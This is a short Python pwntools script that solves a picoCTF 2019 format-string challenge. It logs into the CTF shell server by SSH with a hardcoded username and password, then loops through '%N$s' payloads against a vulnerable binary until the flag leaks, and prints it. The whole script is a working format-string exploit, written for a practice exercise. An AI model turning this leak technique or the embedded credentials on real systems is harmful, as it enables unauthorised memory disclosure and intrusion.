from pwn import *

session = ssh(host="2019shell1.picoctf.com", user="cse331", password="3curityishard", level=50)

i = 0
while True:

    program = session.process(['./vuln'], cwd='/problems/stringzz_2_a90e0d8339487632cecbad2e459c71c4')

    program.recvline()
    payload = "%" + str(i) + "$s"
    program.sendline(payload)
    output = program.recvall()

    i = i + 1

    if b'picoCTF' in output:
        flag = output.decode('ascii')
        rawFlag = flag[flag.index('{') + 1:flag.index('}')]

        print(rawFlag)

        break

